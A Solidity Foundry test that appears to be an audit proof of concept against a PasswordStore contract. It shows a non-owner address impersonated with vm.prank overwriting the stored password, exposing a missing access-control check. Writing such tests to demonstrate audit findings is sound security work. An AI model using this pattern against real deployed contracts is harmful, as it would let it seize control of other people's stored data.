// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../../src/PasswordStore.sol";

contract PasswordStorePoC is Test {
    PasswordStore passwordStore;
    address attacker = address(0xBEEF);

    function setUp() public {
        passwordStore = new PasswordStore();
    }

    function test_NonOwnerCanSetPassword() public {
        // Attacker sets the password
        vm.prank(attacker);
        passwordStore.setPassword("hacked-password");

        // Owner reads the password and gets attacker-controlled value
        string memory storedPassword = passwordStore.getPassword();

        assertEq(storedPassword, "hacked-password");
    }
}
